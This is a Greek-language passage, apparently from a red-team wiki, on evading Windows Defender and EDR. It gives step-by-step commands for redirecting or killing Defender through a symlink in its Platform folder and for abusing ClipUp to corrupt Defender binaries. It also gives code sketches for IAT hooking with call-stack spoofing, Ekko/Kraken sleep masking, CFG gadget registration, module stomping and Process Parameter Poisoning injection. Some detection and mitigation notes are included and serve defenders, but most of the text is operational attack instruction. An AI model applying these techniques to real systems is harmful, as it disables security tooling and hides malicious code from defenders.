# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Σημειώσεις και περιορισμοί
- Δεν μπορείς να ελέγξεις τα περιεχόμενα που γράφει το ClipUp· η primitive είναι κατάλληλη για αλλοίωση και όχι για ακριβή εισαγωγή περιεχομένου.
- Απαιτούνται τοπικά δικαιώματα admin/SYSTEM για την εγκατάσταση/εκκίνηση μιας υπηρεσίας και ένα χρονικό παράθυρο για επανεκκίνηση.
- Ο χρονισμός είναι κρίσιμος: ο στόχος δεν πρέπει να είναι ανοιχτός· η εκτέλεση κατά την εκκίνηση αποφεύγει τα κλειδώματα αρχείων.

Ανιχνεύσεις
- Δημιουργία διεργασίας `ClipUp.exe` με ασυνήθιστα ορίσματα, ειδικά όταν η γονική διεργασία είναι μη τυπικός launcher, κατά την εκκίνηση ή κοντά σε αυτή.
- Νέες υπηρεσίες που έχουν ρυθμιστεί να εκκινούν αυτόματα ύποπτα binary και ξεκινούν σταθερά πριν από το Defender/AV. Διερεύνησε τη δημιουργία/τροποποίηση υπηρεσιών πριν από αποτυχίες εκκίνησης του Defender.
- Παρακολούθηση ακεραιότητας αρχείων για τα binary/καταλόγους Platform του Defender· μη αναμενόμενες δημιουργίες/τροποποιήσεις αρχείων από διεργασίες με protected-process flags.
- Τηλεμετρία ETW/EDR: αναζήτησε διεργασίες που δημιουργήθηκαν με `CREATE_PROTECTED_PROCESS` και ανώμαλη χρήση επιπέδων PPL από binary που δεν σχετίζονται με AV.

Μετριασμοί
- WDAC/Code Integrity: περιόρισε ποια υπογεγραμμένα binary μπορούν να εκτελούνται ως PPL και από ποιες γονικές διεργασίες· απέκλεισε την κλήση του ClipUp εκτός νόμιμων περιπτώσεων.
- Υγιεινή υπηρεσιών: περιόρισε τη δημιουργία/τροποποίηση υπηρεσιών αυτόματης εκκίνησης και παρακολούθησε τη χειραγώγηση της σειράς εκκίνησης.
- Βεβαιώσου ότι είναι ενεργοποιημένα το tamper protection του Defender και οι early-launch προστασίες· διερεύνησε σφάλματα εκκίνησης που υποδεικνύουν αλλοίωση binary.
- Εξέτασε το ενδεχόμενο απενεργοποίησης της δημιουργίας σύντομων ονομάτων 8.3 στους τόμους που φιλοξενούν εργαλεία ασφαλείας, εφόσον αυτό είναι συμβατό με το περιβάλλον σου (κάνε εκτενείς δοκιμές).

## Παραποίηση του Microsoft Defender μέσω κατάληψης Symlink στον φάκελο Platform Version

Το Windows Defender επιλέγει την πλατφόρμα από την οποία εκτελείται απαριθμώντας τους υποφακέλους στο:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Επιλέγει τον υποφάκελο με τη μεγαλύτερη λεξικογραφικά συμβολοσειρά έκδοσης (π.χ., `4.18.25070.5-0`) και, στη συνέχεια, εκκινεί από εκεί τις διεργασίες της υπηρεσίας Defender (ενημερώνοντας αντίστοιχα τις διαδρομές της υπηρεσίας/του μητρώου). Αυτή η επιλογή εμπιστεύεται τις καταχωρίσεις καταλόγων, συμπεριλαμβανομένων των directory reparse points (symlinks). Ένας administrator μπορεί να το εκμεταλλευτεί για να ανακατευθύνει το Defender σε διαδρομή εγγράψιμη από attacker και να επιτύχει DLL sideloading ή διακοπή της υπηρεσίας.<sup>[[21]](#references)[[22]](#references)</sup>

Προϋποθέσεις
- Τοπικός Administrator (απαιτείται για τη δημιουργία καταλόγων/symlinks στον φάκελο Platform)
- Δυνατότητα επανεκκίνησης ή ενεργοποίησης νέας επιλογής πλατφόρμας Defender (επανεκκίνηση υπηρεσίας κατά την εκκίνηση)
- Απαιτούνται μόνο ενσωματωμένα εργαλεία (mklink)

Γιατί λειτουργεί
- Το Defender αποκλείει τις εγγραφές στους δικούς του φακέλους, αλλά η επιλογή πλατφόρμας του εμπιστεύεται τις καταχωρίσεις καταλόγων και επιλέγει την έκδοση με τη μεγαλύτερη λεξικογραφικά ονομασία, χωρίς να επαληθεύει ότι ο στόχος οδηγεί σε προστατευμένη/έμπιστη διαδρομή.

Βήμα προς βήμα (παράδειγμα)
1) Προετοίμασε ένα εγγράψιμο αντίγραφο του τρέχοντος φακέλου πλατφόρμας, π.χ. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Δημιουργήστε ένα symlink καταλόγου υψηλότερης έκδοσης μέσα στο Platform, που να δείχνει στον φάκελό σας:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Επιλογή trigger (συνιστάται επανεκκίνηση):
```cmd
shutdown /r /t 0
```
4) Επαληθεύστε ότι το MsMpEng.exe (WinDefend) εκτελείται από την ανακατευθυνόμενη διαδρομή:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Επιλογές post-exploitation
- DLL sideloading/code execution: Αποθέστε/αντικαταστήστε DLL που φορτώνει το Defender από τον κατάλογο της εφαρμογής του, για να εκτελέσετε κώδικα στις διεργασίες του Defender. Δείτε την παραπάνω ενότητα: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Αφαιρέστε το version-symlink, ώστε στην επόμενη εκκίνηση η διαμορφωμένη διαδρομή να μην επιλύεται και το Defender να μην μπορεί να εκκινηθεί:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Σημειώστε ότι αυτή η τεχνική δεν παρέχει από μόνη της privilege escalation· απαιτεί δικαιώματα admin.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Οι red teams μπορούν να μεταφέρουν το runtime evasion έξω από το C2 implant και μέσα στο ίδιο το target module, κάνοντας hooking στο Import Address Table (IAT) του και δρομολογώντας επιλεγμένα API μέσω attacker-controlled, position‑independent code (PIC). Έτσι, το evasion δεν περιορίζεται πλέον στο μικρό σύνολο API που εκθέτουν πολλά kits (π.χ., CreateProcessA) και οι ίδιες προστασίες επεκτείνονται σε BOFs και post‑exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Προσέγγιση υψηλού επιπέδου
- Τοποθετήστε ένα PIC blob δίπλα στο target module χρησιμοποιώντας reflective loader (με προσθήκη στην αρχή ή ως companion). Το PIC πρέπει να είναι αυτόνομο και position-independent.
- Κατά τη φόρτωση του host DLL, διασχίστε το IMAGE_IMPORT_DESCRIPTOR και διορθώστε τις εγγραφές IAT για τα imports-στόχους (π.χ., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), ώστε να δείχνουν σε λεπτά PIC wrappers.
- Κάθε PIC wrapper εκτελεί evasions πριν κάνει tail-call στη διεύθυνση του πραγματικού API. Συνήθη evasions περιλαμβάνουν:
  - Memory mask/unmask γύρω από την κλήση (π.χ., κρυπτογράφηση περιοχών beacon, RWX→RX, αλλαγή ονομάτων/δικαιωμάτων σελίδων) και κατόπιν επαναφορά.
  - Call-stack spoofing: δημιουργία ενός φαινομενικά αθώου stack και μετάβαση στο target API, ώστε η ανάλυση call stack να εντοπίζει τα αναμενόμενα frames.<sup>[[9]](#references)</sup>
- Για συμβατότητα, εξαγάγετε ένα interface ώστε ένα Aggressor script (ή αντίστοιχο) να μπορεί να δηλώνει ποια API θα γίνει hooking για Beacon, BOFs και post-ex DLLs.

Γιατί IAT hooking εδώ
- Λειτουργεί με οποιονδήποτε κώδικα χρησιμοποιεί το hooked import, χωρίς τροποποίηση του κώδικα του εργαλείου ή εξάρτηση από το Beacon για την προώθηση συγκεκριμένων API.
- Καλύπτει post-ex DLLs: το hooking στα LoadLibrary* σάς επιτρέπει να παρεμβάλλεστε στη φόρτωση modules (π.χ., System.Management.Automation.dll, clr.dll) και να εφαρμόζετε το ίδιο masking/stack evasion στις κλήσεις API τους.
- Επαναφέρει την αξιόπιστη χρήση εντολών post-ex που δημιουργούν διεργασίες, απέναντι σε detections που βασίζονται στο call stack, μέσω wrapper για τα CreateProcessA/W.

Ελάχιστο προσχέδιο IAT hook (ψευδοκώδικας x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Σημειώσεις
- Εφαρμόστε το patch μετά τις relocations/ASLR και πριν από την πρώτη χρήση του import. Reflective loaders όπως τα TitanLdr/AceLdr δείχνουν πώς γίνεται hooking κατά το DllMain του φορτωμένου module.
- Κρατήστε τα wrappers μικρά και ασφαλή για PIC· επιλύστε το πραγματικό API μέσω της αρχικής τιμής IAT που καταγράψατε πριν από το patching ή μέσω του LdrGetProcedureAddress.
- Χρησιμοποιήστε μεταβάσεις RW → RX για PIC και αποφύγετε να αφήνετε σελίδες ταυτόχρονα writable και executable.

Stub για spoofing της call stack
- PIC stubs τύπου Draugr δημιουργούν μια ψεύτικη αλυσίδα κλήσεων (return addresses μέσα σε benign modules) και έπειτα κάνουν pivot στο πραγματικό API.
- Αυτό παρακάμπτει detections που αναμένουν canonical stacks από Beacon/BOFs προς ευαίσθητα APIs.
- Συνδυάστε το με τεχνικές stack cutting/stack stitching, ώστε να καταλήγετε μέσα στα αναμενόμενα frames πριν από το API prologue.

Ενσωμάτωση στις επιχειρήσεις
- Προσθέστε τον reflective loader στην αρχή των post-ex DLLs, ώστε τα PIC και τα hooks να αρχικοποιούνται αυτόματα κατά τη φόρτωση του DLL.
- Χρησιμοποιήστε ένα Aggressor script για να καταχωρίσετε target APIs, ώστε τα Beacon και BOFs να επωφελούνται διαφανώς από την ίδια διαδρομή evasion χωρίς αλλαγές στον κώδικα.

Θέματα detection/DFIR
- Ακεραιότητα IAT: entries που επιλύονται σε διευθύνσεις εκτός image (heap/anon)· περιοδική επαλήθευση των import pointers.
- Ανωμαλίες stack: return addresses που δεν ανήκουν σε φορτωμένα images· απότομες μεταβάσεις σε μη-image PIC· ασυνεπής ancestry του RtlUserThreadStart.
- Τηλεμετρία loader: εγγραφές εντός της διεργασίας στην IAT, πρώιμη δραστηριότητα DllMain που τροποποιεί import thunks, μη αναμενόμενες RX regions που δημιουργούνται κατά τη φόρτωση.
- Evasion κατά τη φόρτωση image: αν κάνετε hooking στο LoadLibrary*, παρακολουθείτε ύποπτες φορτώσεις automation/clr assemblies που συσχετίζονται με συμβάντα memory masking.

Σχετικά δομικά στοιχεία και παραδείγματα
- Reflective loaders που κάνουν IAT patching κατά τη φόρτωση (π.χ. TitanLdr, AceLdr)
- Memory masking hooks (π.χ. simplehook) και stack-cutting PIC (stackcutting)
- PIC stubs για call-stack spoofing (π.χ. Draugr)


## IAT Hooking κατά το Import + Sleep Obfuscation (Crystal Palace/PICO)

### IAT hooks κατά το import μέσω ενός resident PICO

Αν ελέγχετε έναν reflective loader, μπορείτε να κάνετε hooking στα imports **κατά τη διάρκεια** της `ProcessImports()`, αντικαθιστώντας τον pointer `GetProcAddress` του loader με έναν custom resolver που ελέγχει πρώτα τα hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Δημιουργήστε ένα **resident PICO** (persistent PIC object) που παραμένει ενεργό αφού ο transient loader PIC αποδεσμεύσει τη μνήμη του.
- Κάντε export μια συνάρτηση `setup_hooks()` που αντικαθιστά τον import resolver του loader (π.χ., `funcs.GetProcAddress = _GetProcAddress`).
- Στο `_GetProcAddress`, παραλείψτε τα ordinal imports και χρησιμοποιήστε hook lookup βάσει hash, όπως `__resolve_hook(ror13hash(name))`. Αν υπάρχει hook, επιστρέψτε το· διαφορετικά, καλέστε τον πραγματικό `GetProcAddress`.
- Καταχωρίστε τα hook targets κατά το link time με entries Crystal Palace `addhook "MODULE$Func" "hook"`. Το hook παραμένει έγκυρο επειδή βρίσκεται μέσα στο resident PICO.

Έτσι επιτυγχάνεται **IAT redirection κατά το import**, χωρίς patching του code section του φορτωμένου DLL μετά τη φόρτωση.

### Εξαναγκασμός hookable imports όταν ο στόχος χρησιμοποιεί PEB-walking

Τα import-time hooks ενεργοποιούνται μόνο αν η συνάρτηση υπάρχει πράγματι στην IAT του στόχου. Αν ένα module επιλύει APIs μέσω PEB-walk + hash (χωρίς import entry), εξαναγκάστε ένα πραγματικό import, ώστε η διαδρομή `ProcessImports()` του loader να το εντοπίσει:

- Αντικαταστήστε την επίλυση hashed exports (π.χ., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) με άμεση αναφορά, όπως `&WaitForSingleObject`.
- Ο compiler δημιουργεί ένα IAT entry, επιτρέποντας την παρεμβολή όταν ο reflective loader επιλύει τα imports.

### Sleep/idle obfuscation τύπου Ekko χωρίς patching του `Sleep()`

Αντί να κάνετε patch το `Sleep`, κάντε hooking στα **πραγματικά wait/IPC primitives** που χρησιμοποιεί το implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Για μεγάλες αναμονές, τυλίξτε την κλήση σε μια αλυσίδα obfuscation τύπου Ekko, η οποία κρυπτογραφεί την εικόνα στη μνήμη κατά την αδράνεια:<sup>[[31]](#references)[[27]](#references)</sup>

- Χρησιμοποιήστε το `CreateTimerQueueTimer` για να προγραμματίσετε μια ακολουθία callbacks που καλούν το `NtContinue` με κατασκευασμένα `CONTEXT` frames.
- Τυπική αλυσίδα (x64): ορισμός της εικόνας σε `PAGE_READWRITE` → κρυπτογράφηση RC4 μέσω `advapi32!SystemFunction032` σε ολόκληρη τη mapped image → εκτέλεση της blocking wait → αποκρυπτογράφηση RC4 → **επαναφορά των δικαιωμάτων ανά section** με περιήγηση στα PE sections → σήμα ολοκλήρωσης.
- Το `RtlCaptureContext` παρέχει ένα πρότυπο `CONTEXT`· κλωνοποιήστε το σε πολλά frames και ορίστε registers (`Rip/Rcx/Rdx/R8/R9`) για να καλέσετε κάθε βήμα.

Λειτουργική λεπτομέρεια: επιστρέψτε “success” για μεγάλες αναμονές (π.χ., `WAIT_OBJECT_0`), ώστε ο caller να συνεχίσει όσο η εικόνα είναι masked. Αυτό το μοτίβο κρύβει το module από scanners κατά τα διαστήματα αδράνειας και αποφεύγει την κλασική υπογραφή του “patched `Sleep()`”.

Ιδέες για detection (με βάση την τηλεμετρία)
- Ριπές callbacks `CreateTimerQueueTimer` που δείχνουν στο `NtContinue`.
- Χρήση του `advapi32!SystemFunction032` σε μεγάλα, συνεχόμενα buffers μεγέθους εικόνας.
- `VirtualProtect` σε μεγάλο εύρος και έπειτα προσαρμοσμένη επαναφορά δικαιωμάτων ανά section.

### Runtime καταχώριση CFG για gadgets sleep-obfuscation

Σε targets με ενεργοποιημένο CFG, το πρώτο indirect jump σε mid-function gadget όπως το `jmp [rbx]` ή το `jmp rdi` συνήθως προκαλεί crash της διεργασίας με `STATUS_STACK_BUFFER_OVERRUN`, επειδή το gadget δεν υπάρχει στα CFG metadata του module. Για να διατηρήσετε ενεργές αλυσίδες τύπου Ekko/Kraken μέσα σε hardened διεργασίες:<sup>[[30]](#references)</sup>

- Καταχωρίστε κάθε indirect destination που χρησιμοποιεί η αλυσίδα με `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` και entries `CFG_CALL_TARGET_VALID`.
- Για διευθύνσεις μέσα σε φορτωμένα images (`ntdll`, `kernel32`, `advapi32`), το `MEMORY_RANGE_ENTRY` πρέπει να ξεκινά από το **image base** και να καλύπτει ολόκληρο το **image size**.
- Για manually mapped/PIC/stomped regions, χρησιμοποιήστε αντί γι’ αυτό το **allocation base** και το μέγεθος της allocation.
- Επισημάνετε όχι μόνο το dispatch gadget, αλλά και τα exports στα οποία γίνεται έμμεση πρόσβαση (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), καθώς και κάθε executable section ελεγχόμενο από τον attacker που θα γίνει indirect target.

Έτσι οι αλυσίδες ύπνου τύπου ROP/JOP μετατρέπονται από «λειτουργούν μόνο σε διεργασίες χωρίς CFG» σε επαναχρησιμοποιήσιμο primitive για τα `explorer.exe`, browsers, `svchost.exe` και άλλα endpoints που έχουν γίνει compile με `/guard:cf`.

### CET-safe stack spoofing για threads σε κατάσταση ύπνου

Η πλήρης αντικατάσταση του `CONTEXT` είναι θορυβώδης και μπορεί να αποτύχει σε συστήματα CET Shadow Stack, επειδή ένα spoofed `Rip` πρέπει και πάλι να συμφωνεί με το hardware shadow stack. Ένα ασφαλέστερο μοτίβο sleep-masking είναι το εξής:<sup>[[30]](#references)</sup>

- Επιλέξτε ένα άλλο thread της ίδιας διεργασίας και διαβάστε τα όρια stack του `NT_TIB` / TEB (`StackBase`, `StackLimit`) μέσω του `NtQueryInformationThread`.
- Κρατήστε αντίγραφο του πραγματικού TEB/TIB του τρέχοντος thread.
- Καταγράψτε το πραγματικό context του thread που βρίσκεται σε κατάσταση ύπνου με το `GetThreadContext`.
- Αντιγράψτε **μόνο** το πραγματικό `Rip` στο spoof context, αφήνοντας ανέπαφη την spoofed κατάσταση `Rsp`/stack.
- Κατά το διάστημα ύπνου, αντιγράψτε το `NT_TIB` του spoof thread στο τρέχον TEB, ώστε οι stack walkers να κάνουν unwind μέσα σε ένα νόμιμο εύρος stack.
- Όταν ολοκληρωθεί η αναμονή, επαναφέρετε το αρχικό TIB και το thread context.

Αυτό διατηρεί έναν instruction pointer συμβατό με το CET, ενώ παραπλανά τους EDR stack walkers που εμπιστεύονται τα metadata stack του TEB για να επικυρώσουν τα unwinds.

### Εναλλακτική με APC: Kraken Mask

Αν το dispatch μέσω timer-queue έχει υπερβολικά αναγνωρίσιμη υπογραφή, η ίδια ακολουθία sleep-encrypt-spoof-restore μπορεί να εκτελεστεί από ένα suspended helper thread μέσω queued APCs:<sup>[[27]](#references)</sup>

- Δημιουργήστε ένα helper thread με entrypoint το `NtTestAlert`.
- Βάλτε στην ουρά προετοιμασμένα `CONTEXT` frames/APCs με το `NtQueueApcThread` και εκτελέστε τα με το `NtAlertResumeThread`.
- Αποθηκεύστε την κατάσταση της αλυσίδας στο heap αντί για το stack του helper, ώστε να αποφύγετε την εξάντληση του προεπιλεγμένου stack thread των 64 KB.
- Χρησιμοποιήστε το `NtSignalAndWaitForSingleObject` για να δώσετε ατομικά σήμα στο start event και να μπλοκάρετε.
- Κάντε suspend το κύριο thread πριν από την επαναφορά του TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), ώστε να περιορίσετε το race window κατά το οποίο ένας scanner θα μπορούσε να εντοπίσει ένα stack που έχει αποκατασταθεί μόνο εν μέρει.

Αυτό αντικαθιστά την υπογραφή `CreateTimerQueueTimer` + `NtContinue` με μια υπογραφή helper-thread/APC, διατηρώντας τους ίδιους στόχους RC4 masking και stack-spoofing.

Πρόσθετες ιδέες για detection
- `NtSetInformationVirtualMemory` με `VmCfgCallTargetInformation` λίγο πριν από sleeps, waits ή APC dispatch.
- `GetThreadContext`/`SetThreadContext` γύρω από τα `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` ή `ConnectNamedPipe`.
- `NtQueryInformationThread` και έπειτα απευθείας εγγραφές στα όρια stack του TEB/TIB του τρέχοντος thread.
- Αλυσίδες `NtQueueApcThread`/`NtAlertResumeThread` που καταλήγουν έμμεσα στα `SystemFunction032`, `VirtualProtect` ή σε helpers αποκατάστασης δικαιωμάτων section.
- Επαναλαμβανόμενη χρήση σύντομων gadget signatures όπως `FF 23` (`jmp [rbx]`) ή `FF E7` (`jmp rdi`) ως dispatch pivots μέσα σε signed modules.


## Precision Module Stomping

Το module stomping εκτελεί payloads από το **section `.text` ενός DLL που είναι ήδη mapped μέσα στη διεργασία-στόχο**, αντί να δεσμεύει προφανή private executable memory ή να φορτώνει ένα νέο sacrificial DLL. Ο στόχος overwrite πρέπει να είναι ένα **φορτωμένο, disk-backed image**, του οποίου ο χώρος κώδικα μπορεί να χωρέσει το payload χωρίς να αλλοιώσει code paths που εξακολουθεί να χρειάζεται η διεργασία.<sup>[[1]](#references)[[2]](#references)</sup>

### Αξιόπιστη επιλογή στόχου

Το αφελές stomping σε συνηθισμένα modules όπως τα `uxtheme.dll` ή `comctl32.dll` είναι εύθραυστο: το DLL μπορεί να μην είναι φορτωμένο στην απομακρυσμένη διεργασία, ενώ μια περιοχή κώδικα που είναι πολύ μικρή μπορεί να προκαλέσει crash. Μια πιο αξιόπιστη διαδικασία είναι:

1. Κάντε enumerate τα modules της διεργασίας-στόχου και κρατήστε μια **λίστα συμπερίληψης μόνο με ονόματα** για τα DLL που είναι ήδη φορτωμένα.
2. Δημιουργήστε πρώτα το payload και καταγράψτε το **ακριβές μέγεθός του σε bytes**.
3. Σαρώστε υποψήφια DLL στον δίσκο και συγκρίνετε το **`.text` `Misc_VirtualSize`** του PE section με το μέγεθος του payload. Αυτό έχει μεγαλύτερη σημασία από το μέγεθος του αρχείου, επειδή αποτυπώνει το μέγεθος του executable section **όταν γίνεται mapping στη μνήμη**.
4. Αναλύστε τον **Export Address Table (EAT)** και επιλέξτε το RVA μιας exported function ως αρχικό offset για το stomp.
5. Υπολογίστε την **έκταση των επιπτώσεων**: αν το payload υπερβαίνει τα όρια της επιλεγμένης function, θα αντικαταστήσει γειτονικά exports που βρίσκονται μετά από αυτή στη μνήμη.

Συνηθισμένα βοηθητικά εργαλεία για recon/επιλογή που έχουν εμφανιστεί στην πράξη:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Σημειώσεις λειτουργίας
- Προτιμήστε DLLs που είναι **ήδη φορτωμένα** στην απομακρυσμένη διεργασία, ώστε να αποφύγετε τα telemetry events του `LoadLibrary`/των απρόσμενων φορτώσεων image.
- Προτιμήστε exports που εκτελούνται σπάνια από την εφαρμογή-στόχο· διαφορετικά, οι κανονικές διαδρομές κώδικα μπορεί να φτάσουν τα stomped bytes πριν ή μετά τη δημιουργία του thread.
- Τα μεγάλα implants συχνά απαιτούν αλλαγή του τρόπου ενσωμάτωσης του shellcode: από string literal σε **byte-array/braced initializer**, ώστε να αναπαρίσταται σωστά ολόκληρο το buffer στον πηγαίο κώδικα του injector.

Ιδέες για ανίχνευση
- Εγγραφές από απόσταση σε εκτελέσιμες σελίδες με backing από image (`MEM_IMAGE`, `PAGE_EXECUTE*`), αντί για τις συνηθέστερες ιδιωτικές κατανομές RWX/RX.
- Σημεία εισόδου export των οποίων τα bytes στη μνήμη δεν αντιστοιχούν πλέον στο backing file στον δίσκο.
- Remote threads ή context pivots που αρχίζουν την εκτέλεσή τους μέσα σε ένα νόμιμο DLL export του οποίου τα πρώτα bytes τροποποιήθηκαν πρόσφατα.
- Ύποπτες ακολουθίες `VirtualProtect(Ex)` / `WriteProcessMemory` σε σελίδες `.text` DLL, ακολουθούμενες από δημιουργία thread.

## Process Parameter Poisoning (P3)

Το Process Parameter Poisoning (P3) είναι μια τεχνική **process-injection / EDR-evasion** που παρακάμπτει την κλασική διαδρομή απομακρυσμένης εγγραφής (`VirtualAllocEx` + `WriteProcessMemory`). Αντί να αντιγράφει bytes σε έναν ήδη εκτελούμενο στόχο, εκμεταλλεύεται το γεγονός ότι τα Windows **αντιγράφουν επιλεγμένες παραμέτρους εκκίνησης του `CreateProcessW` στη child process** και τις αποθηκεύουν μέσα στο `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Carriers που μπορούν να δηλητηριαστούν και αντιγράφονται από το `CreateProcessW`

Χρήσιμα carriers είναι:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (με `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Πρακτικοί περιορισμοί των carriers:

- Το `lpCommandLine` πρέπει να δείχνει σε **εγγράψιμη μνήμη** για το `CreateProcessW` και έχει όριο **32,767 χαρακτήρες Unicode**, συμπεριλαμβανομένου του null terminator.
- Το `lpEnvironment` πρέπει να είναι ένα block περιβάλλοντος Unicode με διαδοχικές συμβολοσειρές `NAME=VALUE\0`, που τερματίζεται με ένα επιπλέον `\0`.
- Το `lpReserved` είναι επίσημα δεσμευμένο, επομένως η αντιστοίχιση στο `ShellInfo` πρέπει να αντιμετωπίζεται ως λεπτομέρεια υλοποίησης και όχι ως σταθερή, τεκμηριωμένη σύμβαση.

Έτσι, η κανονική δημιουργία διεργασίας μετατρέπεται σε **primitive μεταφοράς payload**. Ο operator δημιουργεί τη child process με δεδομένα εκκίνησης που ελέγχει ο attacker και αφήνει τα Windows να εκτελέσουν την αντιγραφή μεταξύ διεργασιών.

### Ροή αναζήτησης από απόσταση χωρίς API απομακρυσμένης εγγραφής

Μετά τη δημιουργία του child, εντοπίστε το αντιγραμμένο buffer με **μόνο για ανάγνωση** primitives:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → λήψη του `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Ανάγνωση του απομακρυσμένου `PEB`
3. Παρακολούθηση του `PEB.ProcessParameters`
4. Ανάγνωση του `RTL_USER_PROCESS_PARAMETERS`
5. Χρήση του επιλεγμένου pointer:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Ελάχιστη ροή:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Εκτέλεση του αντιγραμμένου buffer παραμέτρων

Η αντιγραμμένη περιοχή παραμέτρων είναι συνήθως `RW`, όχι εκτελέσιμη. Μια συνηθισμένη αλυσίδα P3 είναι:

1. Δημιουργήστε τη διεργασία κανονικά (όχι σε αναστολή)
2. Κάντε εκτελέσιμη την επιλεγμένη σελίδα παραμέτρων με `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Επαναχρησιμοποιήστε το handle του κύριου thread που έχει ήδη επιστραφεί στο `PROCESS_INFORMATION`
4. Ανακατευθύνετε την εκτέλεση με `NtSetContextThread` (`CONTEXT_CONTROL`, αντικαταστήστε το `RIP`)

Σε αντίθεση με τις κλασικές ροές εργασίας thread hijacking, αυτό **δεν απαιτεί** `SuspendThread` / `ResumeThread`· το context μπορεί να αλλάξει απευθείας μέσω του handle του κύριου thread που επιστράφηκε.

Έτσι αποφεύγονται αρκετά API που παρακολουθούνται συχνά για injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- συχνά και τα `SuspendThread` / `ResumeThread`

### Περιορισμός null byte και staged shellcode

Και οι τρεις φορείς είναι **συμβολοσειρές ή δεδομένα παρόμοια με συμβολοσειρές**, επομένως ένα ακατέργαστο payload που περιέχει `0x00` αποκόπτεται κατά τη μεταφορά. Μια πρακτική λύση είναι ένα **null-free πρώτο στάδιο** που ανασυνθέτει σταθερές κατά τον χρόνο εκτέλεσης και έπειτα φορτώνει ένα αυθαίρετο δεύτερο στάδιο.

Ένα απλό μοτίβο είναι η σύνθεση σταθερών με βάση το XOR:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Αυτό επιτρέπει στο πρώτο στάδιο να δημιουργεί συμβολοσειρές στη στοίβα, ορίσματα API, διαδρομές DLL ή έναν loader shellcode δεύτερου σταδίου, χωρίς να ενσωματώνει null bytes στην παράμετρο που μεταφέρεται.

### Κλήσεις API μέσω στοίβας από το πρώτο στάδιο

Όταν το πρώτο στάδιο πρέπει να καλέσει API όπως το `LoadLibraryA`, μπορεί να:

- κάνει push τη συμβολοσειρά/το buffer στη στοίβα του στόχου
- δεσμεύσει το **shadow space 32 byte του x64**
- ορίσει τα `RCX`, `RDX`, `R8`, `R9` σε σταθερές τιμές ή δείκτες σχετικούς με το `RSP`
- διατηρήσει το `RSP` **ευθυγραμμισμένο στα 16 byte** πριν από την κλήση

Στη συνέχεια, το δεύτερο στάδιο μπορεί να αντιγραφεί από τη στοίβα σε μια εκχώρηση `PAGE_READWRITE`, να αλλάξει σε `PAGE_EXECUTE_READ` με `VirtualProtect` και να γίνει jump σε αυτό, αποφεύγοντας μια άμεση εκχώρηση RWX.

### Ιδέες για εντοπισμό

Καλές ευκαιρίες για hunting που αναφέρουν οι συγγραφείς:

- `VirtualProtectEx` / `NtProtectVirtualMemory` που καθιστούν εκτελέσιμες τις σελίδες παραμέτρων διεργασίας
- αλλαγή προστασίας που ακολουθείται από `SetThreadContext` / `NtSetContextThread`
- απομακρυσμένες αναγνώσεις του `PEB` και στη συνέχεια του `RTL_USER_PROCESS_PARAMETERS`
- ασυνήθιστα μεγάλες τιμές ή τιμές υψηλής εντροπίας στα `lpCommandLine`, `lpEnvironment` ή `STARTUPINFO.lpReserved` κατά τη δημιουργία διεργασίας

### Σημειώσεις

